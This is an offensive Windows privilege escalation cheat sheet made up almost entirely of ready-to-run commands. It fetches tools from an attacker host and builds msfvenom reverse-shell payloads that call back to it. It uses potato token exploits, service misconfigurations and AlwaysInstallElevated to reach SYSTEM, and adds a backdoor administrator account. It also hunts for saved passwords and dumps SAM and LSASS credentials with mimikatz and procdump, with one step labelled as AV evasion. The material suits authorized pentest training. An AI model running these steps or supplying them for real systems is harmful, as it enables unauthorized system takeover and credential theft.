🪟 Windows Privilege Escalation

Run winpeas first. Check whoami /priv immediately — SeImpersonatePrivilege enabled = potato time.

Automated Tools

transfer + run winpeas
(New-Object Net.WebClient).DownloadFile('http://<KALI>:8080/winPEASx64.exe','C:\Windows\Temp\wp.exe')
C:\Windows\Temp\wp.exe
# If AV kills it:
C:\Windows\Temp\wp.exe log   # saves to winPEAS.log in cwd
# Read output: RED = check immediately, YELLOW = investigate
output signals
Signal: RED — SeImpersonatePrivilege: Enabled systeminfo | findstr /B /C:"OS Name" /C:"OS Version" -- determine correct potato .\GodPotato-NET4.exe -cmd "cmd /c whoami" -- Win10/11, Server 2019/2022 .\PrintSpoofer64.exe -i -c cmd -- Server 2016/2019 with spooler running
Signal: RED — AlwaysInstallElevated = 1 in both hives msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi -- generate MSI on kali msiexec /quiet /qn /i C:\Windows\Temp\evil.msi -- run as SYSTEM
Signal: YELLOW — unquoted service path with writable dir icacls "C:\Program Files\Vulnerable App" -- confirm write access msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o Program.exe -- generate payload with matching name sc stop <service> && sc start <service> -- trigger execution
Signal: YELLOW — saved credentials found (cmdkey /list) runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Temp\shell.exe" -- run shell as admin with saved creds
move on (to next vector) when winpeas output read fully — not skimmed whoami /priv shows no dangerous privileges — move to services no unquoted paths with writable dirs — move to weak service perms no AlwaysInstallElevated, no saved creds, no weak services — move to password hunting all local vectors exhausted — check if machine is domain-joined, pivot to AD

Manual Baseline Enum

run all immediately after shell
whoami /all                      # CRITICAL: check ALL privileges
whoami /priv                     # SeImpersonatePrivilege? → potato
net user
net localgroup administrators
systeminfo                       # OS version, hotfixes installed
hostname
ipconfig /all
netstat -ano                     # listening ports, internal services
tasklist /svc
schtasks /query /fo LIST /v      # scheduled tasks
wmic service get name,pathname,startmode | findstr /i "auto"
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

Token Impersonation — SeImpersonatePrivilege

If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is Enabled → you almost certainly have a path to SYSTEM.
identify correct potato by OS version
whoami /priv
# Look for: SeImpersonatePrivilege (Enabled)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Windows 10/11, Server 2019/2022 → GodPotato (most universal)
# Windows Server 2016/2019 → PrintSpoofer (if spooler running)
# Windows Server 2008/2012/2016 → JuicyPotato (need CLSID)
GodPotato (Server 2019+, Win10/11)
most common
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"
PrintSpoofer (Server 2016/2019)
sc query spooler   # verify spooler is running
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c "powershell -ep bypass"
.\PrintSpoofer64.exe -c "C:\Windows\Temp\shell.exe"
JuicyPotato (older systems)
# Get CLSID from: https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker P@ss123! /add" -t * -c {CLSID}
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t * -c {CLSID}

Unquoted Service Paths

find + exploit
# Find services with unquoted paths containing spaces:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
# Vulnerable: C:\Program Files\Some App\service.exe (no quotes)
# Windows tries: C:\Program.exe → C:\Program Files\Some.exe → ...

# Check write permissions on each candidate path:
icacls "C:\Program Files\Some App"
# (W) or (F) for BUILTIN\Users = writable

# Generate payload + place it:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o "Some.exe"
# Copy to: C:\Program Files\Some.exe
sc stop <servicename>
sc start <servicename>

Weak Service Permissions

accesschk + exploit
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -ucqv <servicename>
# Look for: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS

# If you can change config:
sc config <servicename> binPath= "cmd /c net user hacker P@ss123! /add"
sc stop <servicename>; sc start <servicename>
sc config <servicename> binPath= "cmd /c net localgroup administrators hacker /add"
sc stop <servicename>; sc start <servicename>
# Now: evil-winrm or RDP as hacker:P@ss123!

AlwaysInstallElevated

check both registry keys + exploit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# BOTH must show: AlwaysInstallElevated    REG_DWORD    0x1

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi
# Transfer to victim, then:
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi

Saved Credentials

cmdkey + runas
cmdkey /list
# If output shows: Target: Domain:interactive=WORKGROUP\Administrator
# → run as that user:
runas /savecred /user:WORKGROUP\Administrator "cmd /c whoami > C:\Windows\Temp\out.txt"
type C:\Windows\Temp\out.txt
# If Administrator → run reverse shell:
runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Temp\shell.exe"
autologon creds in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Look for: DefaultPassword, DefaultUsername, AutoAdminLogon=1

Password Hunting

filesystem + registry search
# Filesystem:
findstr /si "password" *.xml *.ini *.txt *.config *.bak 2>nul
type C:\Windows\System32\sysprep\unattend.xml 2>nul
type C:\inetpub\wwwroot\web.config 2>nul
type "%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml" 2>nul

# Registry:
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s 2>nul

SAM / LSASS Dump

dump SAM with reg (admin required)
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
reg save HKLM\SECURITY C:\Windows\Temp\security.bak
# Download to kali, then parse:
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
mimikatz
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords    # cleartext creds + hashes from LSASS
lsadump::sam                # local SAM hashes
lsadump::lsa /patch         # domain hashes if DC
dump LSASS memory (AV evasion)
(New-Object Net.WebClient).DownloadFile('http://<KALI>:8080/procdump.exe','C:\Windows\Temp\pd.exe')
C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
# Download lsass.dmp to kali, then:
pypykatz lsa minidump lsass.dmp
